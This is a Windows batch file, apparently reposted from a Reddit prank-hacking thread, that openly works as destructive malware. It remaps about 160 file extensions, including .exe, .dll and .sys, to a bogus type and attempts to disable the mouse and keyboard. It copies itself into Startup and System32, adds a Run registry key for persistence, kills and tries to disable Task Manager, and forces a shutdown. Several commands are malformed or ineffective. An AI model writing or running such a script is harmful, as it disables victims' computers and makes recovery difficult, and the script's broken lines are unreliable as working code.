' Source : https://www.reddit.com/r/AssHatHackers/comments/1v9xyr/disable_everything/
' This is a *.bat file that will disable mouse, disable keyboard, disables CTRL+ALT+DELETE task manager and changes all file associations to *.poo.

@echo off
prompt $P $G
assoc .doc = poo
assoc .docx = poo
assoc .log = poo
assoc .msg = poo
assoc .pages = poo
assoc .rtf = poo
assoc .txt = poo
assoc .wpd = poo
assoc .wps = poo
assoc .accdb = poo
assoc .blg = poo
assoc .csv = poo
assoc .dat = poo
assoc .db = poo
assoc .efx = poo
assoc .mdb = poo
assoc .pdb = poo
assoc .pps = poo
assoc .ppt = poo
assoc .pptx = poo
assoc .sdb = poo
assoc .sdf = poo
assoc .sql = poo
assoc .vcf = poo
assoc .wks = poo
assoc .xls = poo
assoc .xlsx = poo
assoc .xml = poo
assoc .bmp = poo
assoc .gif = poo
assoc .jpg = poo
assoc .png = poo
assoc .psd = poo
assoc .psp = poo
assoc .thm = poo
assoc .tif = poo
assoc .ai = poo
assoc .drw = poo
assoc .eps = poo
assoc .ps = poo
assoc .svg = poo
assoc .3dm = poo
assoc .dwg = poo
assoc .dxf = poo
assoc .pln = poo
assoc .indd = poo
assoc .pct = poo
assoc .pdf = poo
assoc .qxd = poo
assoc .qxp = poo
assoc .rels = poo
assoc .aac = poo
assoc .aif = poo
assoc .iff = poo
assoc .m3u = poo
assoc .mid = poo
assoc .mp3 = poo
assoc .mpa = poo
assoc .ra = poo
assoc .wav = poo
assoc .wma = poo
assoc .3g2 = poo
assoc .3gp = poo
assoc .asf = poo
assoc .asx = poo
assoc .avi = poo
assoc .flv = poo
assoc .mov = poo
assoc .mp4 = poo
assoc .mpg = poo
assoc .rm = poo
assoc .swf = poo
assoc .vob = poo
assoc .wmv = poo
assoc .asp = poo
assoc .cer = poo
assoc .csr = poo
assoc .css = poo
assoc .htm = poo
assoc .html = poo
assoc .js = poo
assoc .jsp = poo
assoc .php = poo
assoc .rss = poo
assoc .tvpi = poo
assoc .tvvi = poo
assoc .xhtml = poo
assoc .fnt = poo
assoc .fon = poo
assoc .otf = poo
assoc .ttf = poo
assoc .8bi = poo
assoc .plugin = poo
assoc .xll = poo
assoc .cab = poo
assoc .cpl = poo
assoc .cur = poo
assoc .dll = poo
assoc .dmp = poo
assoc .drv = poo
assoc .key = poo
assoc .lnk = poo
assoc .sys = poo
assoc .cfg = poo
assoc .ini = poo
assoc .keychain = poo
assoc .prf = poo
assoc .app = poo
assoc .bat = poo
assoc .cgi = poo
assoc .com = poo
assoc .exe = poo
assoc .pif = poo
assoc .vb = poo
assoc .ws = poo
assoc .7z = poo
assoc .deb = poo
assoc .gz = poo
assoc .pkg = poo
assoc .rar = poo
assoc .sit = poo
assoc .sitx = poo
assoc .tar.gz = poo
assoc .zip = poo
assoc .zipx = poo
assoc .bin = poo
assoc .hqx = poo
assoc .mim = poo
assoc .uue = poo
assoc .c = poo
assoc .cpp = poo
assoc .dtd = poo
assoc .java = poo
assoc .pl = poo
assoc .bak = poo
assoc .bup = poo
assoc .gho = poo
assoc .ori = poo
assoc .tmp = poo
assoc .dmg = poo
assoc .iso = poo
assoc .toast = poo
assoc .vcd = poo
assoc .gam = poo
assoc .nes = poo
assoc .rom = poo
assoc .sav = poo
assoc .dbx = poo
assoc .msi = poo
assoc .part = poo
assoc .torrent = poo
assoc .yps = poo
rundll32.exe mouse, disable
rundll32.exe keyboard, disable
copy setup.bat %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
copy setup.bat %windir%\System32
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v poo /t REG_SZ /d %windir%\System32 \setup.bat
taskkill /f /im taskmgr.exe
reg restore HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System DisableTaskMgr = 1
shutdown -s -f -t 10 -c "poo!!!"